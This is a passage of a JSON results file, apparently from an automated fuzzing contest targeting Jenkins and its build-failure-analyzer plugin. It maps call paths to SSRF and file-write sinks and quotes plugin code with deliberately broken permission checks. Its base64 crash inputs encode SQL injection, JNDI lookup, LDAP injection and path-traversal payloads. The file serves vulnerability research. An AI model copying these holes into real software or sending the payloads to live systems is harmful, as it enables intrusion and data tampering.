{\n 230               LOGGER.log(Level.SEVERE, \"Failed to load \" + config, e);\n 231           }\n 232       }\n 534       private static @Nullable User getOrCreateById(@NonNull String id, @NonNull String fullName, boolean create) {\n 535           User u = AllUsers.get(id);\n 536           if (u == null && (create || UserIdMapper.getInstance().isMapped(id))) {\n 537               u = new User(id, fullName);\n 538               AllUsers.put(id, u);\n 539               if (!id.equals(fullName) && !UserIdMapper.getInstance().isMapped(id)) {\n 540                   try {\n 541                       u.save();\n 542                   } catch (IOException x) {\n 543                       LOGGER.log(Level.WARNING, \"Failed to save user configuration for \" + id, x);\n 544                   }\n 545               }\n 546           }\n 547           return u;\n 548       }\n 597       public static @CheckForNull User current() {\n 598           return get2(Jenkins.getAuthentication2());\n 599       }\n 609       public static @CheckForNull User get2(@CheckForNull Authentication a) {\n 610           if (a == null || a instanceof AnonymousAuthenticationToken)\n 611               return null;\n 612   \n 613           // Since we already know this is a name, we can just call getOrCreateById with the name directly.\n 614           return getById(a.getName(), true);\n 615       }\n 637       public static @Nullable User getById(String id, boolean create) {\n 638           return getOrCreateById(id, id, create);\n 639       }\n\nsrc/jenkins/core/src/main/java/hudson/XmlFile.java:\n178       public Object unmarshal(Object o) throws IOException {\n179           return unmarshal(o, false);\n180       }\n190       private Object unmarshal(Object o, boolean nullOut) throws IOException {\n191           try (InputStream in = new BufferedInputStream(Files.newInputStream(file.toPath()))) {\n192               // TODO: expose XStream the driver from XStream\n193               if (nullOut) {\n194                   return ((XStream2) xs).unmarshal(DEFAULT_DRIVER.createReader(in), o, null, true);\n195               } else {\n196                   return xs.unmarshal(DEFAULT_DRIVER.createReader(in), o);\n197               }\n198           } catch (RuntimeException | Error e) {\n199               throw new IOException(\"Unable to read \" + file, e);\n200           }\n201       }\n",
            "cost": 0.07046,
            "harness_id": "id_4",
            "sanitizer": "File read/write hook path",
            "sink": "src/jenkins/core/src/main/java/hudson/XmlFile.java:191:76",
            "status": "corpus",
            "valid_path": "NO",
            "id": 44
        },
        {
            "blob": [
                ""
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-four/src/main/java/com/aixcc/jenkins/harnesses/four/JenkinsFour.java:\n 78       public static void fuzzerTestOneInput(byte[] data) throws Throwable {\n 79           try {\n 80               new JenkinsFour().fuzz(data);\n 81           } catch (FuzzerSecurityIssueLow | FuzzerSecurityIssueMedium | FuzzerSecurityIssueHigh\n 82                   | FuzzerSecurityIssueCritical e) {\n 83               throw e;\n 84           } catch (Throwable t) {\n 85           }\n 86       }\n 88       public void fuzz(byte[] data) throws Throwable {\n 89           ByteBuffer buffer = ByteBuffer.wrap(data);\n 90           int numRequests = (int) buffer.get();\n 91           if (numRequests < 0)\n 92               return;\n 93   \n 94           RequestImpl requestImpl = null;\n 95           for (int i = 0; i < numRequests; ++i) {\n 96               int command = (int) buffer.get();\n 97               switch (command) {\n 98                   case 5:\n 99                       requestImpl = createHttpRequest(buffer);\n100                       failureCause = causeManagement.getDynamic(requestImpl.getParameter(\"id\"), requestImpl,\n101                               responseImpl);\n102                       failureCause.setId(\"0\");\n103                       break;\n104                   case 19:\n105                       setPermission((int) buffer.get());\n106                       break;\n107                   case 24:\n108                       requestImpl = createHttpRequest(buffer);\n109                       causeManagement.doRemoveConfirm(requestImpl.getParameter(\"id\"), requestImpl, responseImpl);\n110                       break;\n111                   case 33:\n112                       requestImpl = createHttpRequest(buffer);\n113                       knowledgeBaseDescriptor.doSave(requestImpl);\n114                       break;\n115                   case 59:\n116                       requestImpl = createHttpRequest(buffer);\n117                       failureCause.doConfigSubmit(requestImpl, responseImpl);\n118                       break;\n119                   case 63:\n120                       requestImpl = createHttpRequest(buffer);\n121                       knowledgeBaseDescriptor.doLoad(requestImpl);\n122                       break;\n123                   case 87:\n124                       requestImpl = createHttpRequest(buffer);\n125                       knowledgeBaseDescriptor.doForceUpdate(requestImpl);\n126                       break;\n127                   default:\n128                       break;\n129               }\n130           }\n131       }\n\nsrc/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/CauseManagement.java:\n228       public void doRemoveConfirm(@QueryParameter String id, StaplerRequest request, StaplerResponse response)\n229               throws IOException {\n230           boolean hasPermission = Jenkins.getInstance().hasPermission(PluginImpl.REMOVE_PERMISSION);\n231           id = Util.fixEmpty(id);\n232           if (id != null || hasPermission) {\n233               try {\n234                   FailureCause cause = PluginImpl.getInstance().getKnowledgeBase().removeCause(id);\n235                   if (cause != null) {\n236                       try {\n237                           String comment = cause.getComment();\n238                           if (comment.startsWith(\"notice:\")) {\n239                               String addr = comment.substring(comment.indexOf(\":\") + 1);\n240                               HttpClient httpClient = HttpClient.newHttpClient();\n241                               HttpRequest httpRequest = HttpRequest.newBuilder()\n242                                   .uri(new URI(addr))\n243                                   .GET()\n244                                   .build();\n245                               httpClient.send(httpRequest, HttpResponse.BodyHandlers.ofString());\n246                           }\n247                       } catch (Exception e) {}\n248                       request.getSession(true).setAttribute(SESSION_REMOVED_FAILURE_CAUSE, cause);\n249                   }\n250               } catch (Exception e) {\n251                   //Should we use errorMessage here as well?\n252                   throw (Failure)(new Failure(e.getMessage()).initCause(e));\n253               }\n254           }\n255           response.sendRedirect2(\"./\");\n256       }\n\nsrc/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/db/LocalFileKnowledgeBase.java:\n192       @Override\n193       public FailureCause removeCause(String id) throws Exception {\n194           FailureCause remove = causes.remove(id);\n195           getPlugin().save();\n196           return remove;\n197       }\n\nsrc/jenkins/core/src/main/java/hudson/model/Descriptor.java:\n 908       @Override\n 909       public synchronized void save() {\n 910           if (BulkChange.contains(this))   return;\n 911           try {\n 912               getConfigFile().write(this);\n 913               SaveableListener.fireOnChange(this, getConfigFile());\n 914           } catch (IOException e) {\n 915               LOGGER.log(Level.WARNING, \"Failed to save \" + getConfigFile(), e);\n 916           }\n 917       }\n\nsrc/jenkins/core/src/main/java/hudson/XmlFile.java:\n203       public void write(Object o) throws IOException {\n204           mkdirs();\n205           AtomicFileWriter w = force\n206                   ? new AtomicFileWriter(file)\n207                   : new AtomicFileWriter(file.toPath(), StandardCharsets.UTF_8, false, false);\n208           try {\n209               w.write(\"<?xml version='1.1' encoding='UTF-8'?>\\n\");\n210               beingWritten.put(o, null);\n211               writing.set(file);\n212               try {\n213                   xs.toXML(o, w);\n214               } finally {\n215                   beingWritten.remove(o);\n216                   writing.set(null);\n217               }\n218               w.commit();\n219           } catch (RuntimeException e) {\n220               throw new IOException(e);\n221           } finally {\n222               w.abort();\n223           }\n224       }\n\nsrc/jenkins/core/src/main/java/hudson/util/AtomicFileWriter.java:\n122       @Deprecated\n123       public AtomicFileWriter(@NonNull Path destinationPath, @NonNull Charset charset, boolean integrityOnFlush, boolean integrityOnClose) throws IOException {\n124           if (charset == null) { // be extra-defensive if people don't care\n125               throw new IllegalArgumentException(\"charset is null\");\n126           }\n127           this.destPath = destinationPath;\n128           Path dir = this.destPath.getParent();\n129   \n130           if (Files.exists(dir) && !Files.isDirectory(dir)) {\n131               throw new IOException(dir + \" exists and is neither a directory nor a symlink to a directory\");\n132           }\n133           else {\n134               if (Files.isSymbolicLink(dir)) {\n135                   LOGGER.log(Level.CONFIG, \"{0} is a symlink to a directory\", dir);\n136               } else {\n137                   Files.createDirectories(dir); // Cannot be called on symlink, so we are pretty defensive...\n138               }\n139           }\n140   \n141           try {\n142               // JENKINS-48407: NIO's createTempFile creates file with 0600 permissions, so we use pre-NIO for this...\n143               tmpPath = File.createTempFile(\"atomic\", \"tmp\", dir.toFile()).toPath();\n144           } catch (IOException e) {\n145               throw new IOException(\"Failed to create a temporary file in \" + dir, e);\n146           }\n147   \n148           if (DISABLE_FORCED_FLUSH) {\n149               integrityOnFlush = false;\n150               integrityOnClose = false;\n151           }\n152   \n153           core = new FileChannelWriter(tmpPath, charset, integrityOnFlush, integrityOnClose, StandardOpenOption.WRITE, StandardOpenOption.CREATE);\n154       }\n\nsrc/jenkins/core/src/main/java/hudson/util/FileChannelWriter.java:\n61       FileChannelWriter(Path filePath, Charset charset, boolean forceOnFlush, boolean forceOnClose, OpenOption... options) throws IOException {\n62           this.charset = charset;\n63           this.forceOnFlush = forceOnFlush;\n64           this.forceOnClose = forceOnClose;\n65           channel = FileChannel.open(filePath, options);\n66       }\n",
            "cost": 0.065455,
            "harness_id": "id_4",
            "sanitizer": "File read/write hook path",
            "sink": "src/jenkins/core/src/main/java/hudson/util/FileChannelWriter.java:65:36",
            "status": "corpus",
            "valid_path": "NO",
            "id": 45
        },
        {
            "blob": [
                ""
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-four/src/main/java/com/aixcc/jenkins/harnesses/four/JenkinsFour.java:\n 78       public static void fuzzerTestOneInput(byte[] data) throws Throwable {\n 79           try {\n 80               new JenkinsFour().fuzz(data);\n 81           } catch (FuzzerSecurityIssueLow | FuzzerSecurityIssueMedium | FuzzerSecurityIssueHigh\n 82                   | FuzzerSecurityIssueCritical e) {\n 83               throw e;\n 84           } catch (Throwable t) {\n 85           }\n 86       }\n 88       public void fuzz(byte[] data) throws Throwable {\n 89           ByteBuffer buffer = ByteBuffer.wrap(data);\n 90           int numRequests = (int) buffer.get();\n 91           if (numRequests < 0)\n 92               return;\n 93   \n 94           RequestImpl requestImpl = null;\n 95           for (int i = 0; i < numRequests; ++i) {\n 96               int command = (int) buffer.get();\n 97               switch (command) {\n 98                   case 5:\n 99                       requestImpl = createHttpRequest(buffer);\n100                       failureCause = causeManagement.getDynamic(requestImpl.getParameter(\"id\"), requestImpl,\n101                               responseImpl);\n102                       failureCause.setId(\"0\");\n103                       break;\n104                   case 19:\n105                       setPermission((int) buffer.get());\n106                       break;\n107                   case 24:\n108                       requestImpl = createHttpRequest(buffer);\n109                       causeManagement.doRemoveConfirm(requestImpl.getParameter(\"id\"), requestImpl, responseImpl);\n110                       break;\n111                   case 33:\n112                       requestImpl = createHttpRequest(buffer);\n113                       knowledgeBaseDescriptor.doSave(requestImpl);\n114                       break;\n115                   case 59:\n116                       requestImpl = createHttpRequest(buffer);\n117                       failureCause.doConfigSubmit(requestImpl, responseImpl);\n118                       break;\n119                   case 63:\n120                       requestImpl = createHttpRequest(buffer);\n121                       knowledgeBaseDescriptor.doLoad(requestImpl);\n122                       break;\n123                   case 87:\n124                       requestImpl = createHttpRequest(buffer);\n125                       knowledgeBaseDescriptor.doForceUpdate(requestImpl);\n126                       break;\n127                   default:\n128                       break;\n129               }\n130           }\n131       }\n\nsrc/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/CauseManagement.java:\n228       public void doRemoveConfirm(@QueryParameter String id, StaplerRequest request, StaplerResponse response)\n229               throws IOException {\n230           boolean hasPermission = Jenkins.getInstance().hasPermission(PluginImpl.REMOVE_PERMISSION);\n231           id = Util.fixEmpty(id);\n232           if (id != null || hasPermission) {\n233               try {\n234                   FailureCause cause = PluginImpl.getInstance().getKnowledgeBase().removeCause(id);\n235                   if (cause != null) {\n236                       try {\n237                           String comment = cause.getComment();\n238                           if (comment.startsWith(\"notice:\")) {\n239                               String addr = comment.substring(comment.indexOf(\":\") + 1);\n240                               HttpClient httpClient = HttpClient.newHttpClient();\n241                               HttpRequest httpRequest = HttpRequest.newBuilder()\n242                                   .uri(new URI(addr))\n243                                   .GET()\n244                                   .build();\n245                               httpClient.send(httpRequest, HttpResponse.BodyHandlers.ofString());\n246                           }\n247                       } catch (Exception e) {}\n248                       request.getSession(true).setAttribute(SESSION_REMOVED_FAILURE_CAUSE, cause);\n249                   }\n250               } catch (Exception e) {\n251                   //Should we use errorMessage here as well?\n252                   throw (Failure)(new Failure(e.getMessage()).initCause(e));\n253               }\n254           }\n255           response.sendRedirect2(\"./\");\n256       }\n",
            "cost": 0.04005,
            "harness_id": "id_4",
            "sanitizer": "Server Side Request Forgery (SSRF)",
            "sink": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/CauseManagement.java:245:45",
            "status": "corpus",
            "valid_path": "NO",
            "id": 46
        },
        {
            "blob": [
                "AVcCamF6emVyLXRyYXZlcnNhbABSWGh3Ykc5cGRFUmhkR0U9AHsia2V5IjoidmFsdWUifQA="
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-four/src/main/java/com/aixcc/jenkins/harnesses/four/JenkinsFour.java:\n 78       public static void fuzzerTestOneInput(byte[] data) throws Throwable {\n 79           try {\n 80               new JenkinsFour().fuzz(data);\n 81           } catch (FuzzerSecurityIssueLow | FuzzerSecurityIssueMedium | FuzzerSecurityIssueHigh\n 82                   | FuzzerSecurityIssueCritical e) {\n 83               throw e;\n 84           } catch (Throwable t) {\n 85           }\n 86       }\n 88       public void fuzz(byte[] data) throws Throwable {\n 89           ByteBuffer buffer = ByteBuffer.wrap(data);\n 90           int numRequests = (int) buffer.get();\n 91           if (numRequests < 0)\n 92               return;\n 93   \n 94           RequestImpl requestImpl = null;\n 95           for (int i = 0; i < numRequests; ++i) {\n 96               int command = (int) buffer.get();\n 97               switch (command) {\n 98                   case 5:\n 99                       requestImpl = createHttpRequest(buffer);\n100                       failureCause = causeManagement.getDynamic(requestImpl.getParameter(\"id\"), requestImpl,\n101                               responseImpl);\n102                       failureCause.setId(\"0\");\n103                       break;\n104                   case 19:\n105                       setPermission((int) buffer.get());\n106                       break;\n107                   case 24:\n108                       requestImpl = createHttpRequest(buffer);\n109                       causeManagement.doRemoveConfirm(requestImpl.getParameter(\"id\"), requestImpl, responseImpl);\n110                       break;\n111                   case 33:\n112                       requestImpl = createHttpRequest(buffer);\n113                       knowledgeBaseDescriptor.doSave(requestImpl);\n114                       break;\n115                   case 59:\n116                       requestImpl = createHttpRequest(buffer);\n117                       failureCause.doConfigSubmit(requestImpl, responseImpl);\n118                       break;\n119                   case 63:\n120                       requestImpl = createHttpRequest(buffer);\n121                       knowledgeBaseDescriptor.doLoad(requestImpl);\n122                       break;\n123                   case 87:\n124                       requestImpl = createHttpRequest(buffer);\n125                       knowledgeBaseDescriptor.doForceUpdate(requestImpl);\n126                       break;\n127                   default:\n128                       break;\n129               }\n130           }\n131       }\n145       private RequestImpl createHttpRequest(ByteBuffer buffer) throws Throwable {\n146           HttpSession httpSession = Mockito.mock(HttpSession.class);\n147           HttpServletRequest httpRequest = Mockito.mock(HttpServletRequest.class);\n148           RequestImpl requestImpl = spy(new RequestImpl(replacer.stapler, httpRequest, Collections.emptyList(), null));\n149           when(httpRequest.getSession(anyBoolean())).thenReturn(httpSession);\n150           int numParams = (int) buffer.get();\n151           if (numParams > 0) {\n152               for (int i = 0; i < numParams; ++i) {\n153                   String name = readStringUntilNullByte(buffer);\n154                   String value = readStringUntilNullByte(buffer);\n155                   when(httpRequest.getParameter(name)).thenReturn(value);\n156               }\n157           }\n158           String form = readStringUntilNullByte(buffer);\n159           if (form.length() == 0) {\n160               form = \"{}\";\n161           }\n162           // NOTE: Below is to prevent hang from JSONObject.fromObject.\n163           // JSONObject.fromObject has infinite loop vulnerability when a specific value\n164           // is given.\n165           // int startIndex = form.indexOf(\"/*\", 0);\n166           // while (startIndex != -1) {\n167           // int endIndex = form.indexOf(\"*/\", startIndex+2);\n168           // int starIndex = form.indexOf(\"*\", startIndex+2);\n169           // if ((starIndex < endIndex) || (endIndex == -1)) {\n170           // form = \"{}\";\n171           // break;\n172           // }\n173           // if (endIndex == -1) {\n174           // break;\n175           // }\n176           // startIndex = form.indexOf(\"/*\", endIndex+2);\n177           // }\n178           JSONObject formObject = JSONObject.fromObject(form);\n179           doReturn(formObject).when(requestImpl).getSubmittedForm();\n180           return requestImpl;\n181       }\n\nsrc/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/db/LocalFileKnowledgeBase.java:\n155       public boolean updateForcefully(String id, byte[] data) throws IOException {\n156           Path path = Paths.get(Jenkins.get().getRootDir().toString(), PluginImpl.getStaticResourcesBase(), PATH).resolve(id);\n157           if (!Files.exists(path)) {\n158               return false;\n159           }\n160           Files.write(path, data, StandardOpenOption.TRUNCATE_EXISTING);\n161           return true;\n162       }\n357           @POST\n358           public FormValidation doForceUpdate(StaplerRequest request) {\n359               Jenkins jenkins = Jenkins.get();\n360               boolean permitted = jenkins.hasPermission(Jenkins.ADMINISTER);\n361               boolean hasParams = request.hasParameter(\"id\") && request.hasParameter(\"data\");\n362               if (!permitted && !hasParams) {\n363                   return FormValidation.error(\"Illegal Access\");\n364               }\n365   \n366               LocalFileKnowledgeBase knowledgeBase = (LocalFileKnowledgeBase) PluginImpl.getInstance().getKnowledgeBase();\n367               try {\n368                   if (!knowledgeBase.updateForcefully(request.getParameter(\"id\"),\n369                           Base64.getDecoder().decode(request.getParameter(\"data\")))) {\n370                       return FormValidation.error(\"Failed to update\");\n371                   }\n372               } catch (IOException e) {\n373                   return FormValidation.error(e.getMessage());\n374               }\n375   \n376               return FormValidation.ok();\n377           }\n",
            "cost": 0.430605,
            "harness_id": "id_4",
            "sanitizer": "File read/write hook path",
            "sink": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/db/LocalFileKnowledgeBase.java:160:21",
            "status": "corpus",
            "valid_path": "YES",
            "id": 47
        }
    ],
    "result": [
        {
            "harness_id": "id_1",
            "blob": [
                "",
                "AAAADQAAAAF4LWV2aWwtYmFja2Rvb3IAYnJlYWtpbiB0aGUgbGF3AGphenpl"
            ]
        },
        {
            "harness_id": "id_3",
            "blob": [
                "",
                "AAAA0WNtZAAxAG1zZwBTR1ZzYkc4PQBsaWIAamF6emVyX2hvbmV5cG90AGZyZWVsb2FkAHRydWU=",
                "AAAA0WNtZAAxAG1zZwBkR1Z6ZEE9PQBsaWIAamF6emVyX2hvbmV5cG90AGZyZWVsb2FkAHRydWUAZXh0cmExAGV4dHJhMg==",
                "AAAAC25hbWUAcHJveHlOYW1lAHBvcnQAODA4MABub3Byb3h5aG9zdABldmlsKnBhdHRlcm4=",
                "AAAAC25hbWUAcHJveHluYW1lAHBvcnQAODA4MABodHRwOi8vamF6emVyLmV4YW1wbGUuY29t",
                "AAAAC25hbWUAdGVzdF9uYW1lAHBvcnQAODA4MABub3Byb3h5aG9zdAAq",
                "AAAAC3Byb3h5TmFtZQA4MDgwAG5vUHJveHlIb3N0AHVzZXJOYW1lAGh0dHA6Ly9qYXp6ZXIuZXhhbXBsZS5jb20=",
                "AAAAIQEBAgAIdXBsb2FkSWQAATEACnVwbG9hZFBhdGgAHC4uLy4uLy4uLy4uL2phenplci10cmF2ZXJzYWwAAA==",
                "AAAAIQEBAgAIdXBsb2FkSWQABDEyMzQACnVwbG9hZFBhdGgAFi4uLy4uL2phenplci10cmF2ZXJzYWwAAA==",
                "AAAAJSIiamF6IisiemVyIiI=",
                "AAAAJioAKgBpcnJlbGV2YW50AGlycmVsZXZhbnQA",
                "AAAAJm5hbWUAYWRtKm4AcGFzc3dvcmQAbmltZCoA",
                "AAAAJm5hbWUAYWRtKm4AcGFzc3dvcmQAbmltZGE=",
                "AAAAJm5hbWUAYWRtaW4AcGFzc3dvcmQAJHtqbmRpOmxkYXA6Ly9nLmNvL30=",
                "AAAAJm5hbWUAYWRtaW4qAHBhc3N3b3JkAG5pbWRhKg==",
                "AAAAJm5hbWUAbm90YWRtaW4xAHBhc3N3b3JkAHdyb25ncGFzczE=",
                "AAAASXBhcmFtAGRvY3VtZW50KDIpAHZhbGlkV3JhcHBlcg==",
                "AAAASXBhcmFtAHZhbHVlAGRvY3VtZW50KDIp",
                "AAAASXdyYXBwZXIAKgB0ZXN0VHJlZQ==",
                "AAAATWlwAC4qAHNraXAAdHJ1ZQ==",
                "AAAATWlwADE5Mi4xNjguMS4xKi4qAHNraXAAZmFsc2U=",
                "AAAAjklEACcgT1IgJzEnPScxJzsgLS0gAFBXAGlycmVsZXZhbnRwYXNzd29yZA==",
                "AAAAkGNvdmVyYWdlL2phenplci10cmF2ZXJzYWwAYldGc2FXTnBiM1Z6WDJOdmJuUmxiblE9",
                "AAAAkGNvdmVyYWdlX3JlcG9ydAByTzBBQlhOeUFBOXFZWFpoTG5WMGFXd3VTR0Z6YUZObGROR2ZIWmtHaHpncUF3QUFlSEIzQ0FBQUFCQUFBQUFB",
                "AAAAvnVzZXJuYW1lACgAa2V5AHBhc3N3b3JkAA==",
                "AAAAvnVzZXJuYW1lAChhZG1pbikAa2V5AGlycmVsZXZhbnQ=",
                "AAAAvnVzZXJuYW1lAGFkbWluKShjbj0qKSkofChjbj0qAGtleQBwYXNzd29yZA=="
            ]
        },
        {
            "harness_id": "id_4",
            "blob": [
                "",
                "ARgBaWQAY3JhZnRlZF9pZAAA",
                "ARgBaWQAamF6emVyLXRyYXZlcnNhbAAA",
                "ATsBZm9ybQB7ImlkIjogIjAiLCAibmFtZSI6ICJ0ZXN0IiwgImRlc2NyaXB0aW9uIjogInRlc3QiLCAiaW5kaWNhdGlvbnMiOiBbeyJwYXR0ZXJuIjogIioifV19AA==",
                "AVcCLi4vLi4vLi4vLi4vLi4vLi4vamF6emVyLXRyYXZlcnNhbABaWGh3Ykc5cGRDMWpiMjUwWlc1MAAA",
                "AVcCamF6emVyLXRyYXZlcnNhbABSWGh3Ykc5cGRFUmhkR0U9AHsia2V5IjoidmFsdWUifQA="
            ]
        }
    ]
}